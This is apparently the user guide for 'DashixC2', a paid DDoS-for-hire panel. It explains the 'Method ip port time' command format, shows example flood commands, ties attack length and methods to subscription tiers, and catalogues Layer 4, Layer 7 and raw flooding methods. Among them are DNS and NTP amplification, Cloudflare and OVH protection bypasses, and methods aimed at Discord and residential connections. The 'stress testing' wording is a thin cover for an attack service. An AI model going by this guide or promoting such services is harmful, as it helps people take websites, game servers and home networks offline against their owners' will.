  2. Install PuTTY: Run the installer and follow the on-screen instructions to install PuTTY on your device.

Using the Attack Feature

Learn how to launch attacks using DashixC2 with the command format: Method ip port time.

Attack Command Format

To initiate an attack in the DashixC2 panel, use the following command structure in the command-line interface:

Method ip port time
  • Method: The attack method (e.g., UDP, TCPBYPASS, DASHIXRAW). Refer to the Methods section for details.
  • ip: The target IP address (e.g., 192.168.1.1).
  • port: The target port (e.g., 80 for HTTP, 25565 for Minecraft). Use 0 for methods that don’t require a specific port.
  • time: Duration of the attack in seconds (e.g., 60). Limited by your plan (e.g., 60s for Trial, 450s for Platinum).

Example Commands

UDP 192.168.1.1 0 60

Launches a 60-second UDP flood against 192.168.1.1.

TCPBYPASS 10.0.0.1 80 300

Initiates a 300-second TCPBYPASS attack on port 80 of 10.0.0.1 (VIP only).

DASHIXRAW 172.16.0.1 0 450

Executes a 450-second DASHIXRAW attack on 172.16.0.1 (Custom, Platinum plan recommended).

Tips for Success

  • Ensure your plan supports the method (e.g., VIP methods require Bronze or higher).
  • Respect cooldown periods (e.g., 60s for Trial, 0s for Platinum).
  • Use help in the panel to list available methods and verify your plan’s limits.
  • Contact Discord support for issues or to upgrade your plan.

Methods

DashixC2 offers a powerful suite of Layer 4, Layer 7, Raw, and Custom methods for network stress testing and operations.

Layer 4

  • UDP: Floods the target with UDP packets, overwhelming network resources. Ideal for general stress testing.
    UDP ip 0 time
  • UDPBYPASS [VIP]: Bypasses common UDP protections, targeting advanced network setups.
    UDPBYPASS ip 0 time
  • UDP-GAME: Optimized for gaming servers, targeting ports like 27015 or 25565.
    UDP-GAME ip port time
  • TCP: Sends TCP packets to disrupt network connections, compatible with most targets.
    TCP ip port time
  • TCPBYPASS [VIP]: Circumvents TCP-based protections for enhanced impact.
    TCPBYPASS ip port time
  • TCP-GAME: Tailored for gaming server ports, maximizing disruption.
    TCP-GAME ip port time
  • SSH [VIP]: Targets SSH services (port 22) with high-intensity flooding.
    SSH ip 22 time
  • OVH [VIP]: Bypasses OVH hosting protections, ideal for OVH-hosted targets.
    OVH ip port time
  • DNS: Amplifies DNS queries to overload name servers.
    DNS ip 53 time
  • NTP: Uses NTP amplification for high-volume attacks.
    NTP ip 123 time
  • DISCORD [VIP]: Targets Discord infrastructure, focusing on voice or API endpoints.
    DISCORD ip port time
  • HOMEHOLDER [VIP]: Attacks residential network endpoints with precision.
    HOMEHOLDER ip port time

Layer 7

  • BROWSER [VIP]: Simulates browser-based HTTP requests to overwhelm web servers.
    BROWSER ip 80 time
  • CLOUDFLARE [VIP]: Bypasses Cloudflare protections, targeting web applications.
    CLOUDFLARE ip 80 time
  • HTTPS: Floods HTTPS services (port 443) with encrypted requests.
    HTTPS ip 443 time
  • HTTP: Sends high-volume HTTP requests to overload web servers.
    HTTP ip 80 time
  • TLS: Disrupts TLS handshakes, targeting secure connections.
    TLS ip 443 time

Raw

  • !UDP [RAW]: Raw UDP packet flooding for maximum network saturation.
    !UDP ip 0 time
  • !FLUX [RAW]: High-intensity flux-based attack for rapid disruption.
    !FLUX ip 0 time
  • !TCP-SYN [RAW]: Floods with TCP SYN packets to exhaust server resources.
    !TCP-SYN ip port time
  • !TCP-ACK [RAW]: Sends TCP ACK packets to bypass certain filters.
    !TCP-ACK ip port time
  • !GAME [RAW]: Raw attack optimized for gaming servers.
    !GAME ip port time
  • !STD [RAW]: Standard raw packet flooding for versatile use.
    !STD ip 0 time
  • !PAKI [RAW]: Custom raw method for specialized targets.
    !PAKI ip 0 time
  • !NUKE [RAW]: Extreme raw flooding for maximum impact.
    !NUKE ip 0 time

Custom

  • DASHIXRAW [CUSTOM]: Proprietary high-performance method for advanced network stress testing.
    DASHIXRAW ip 0 time
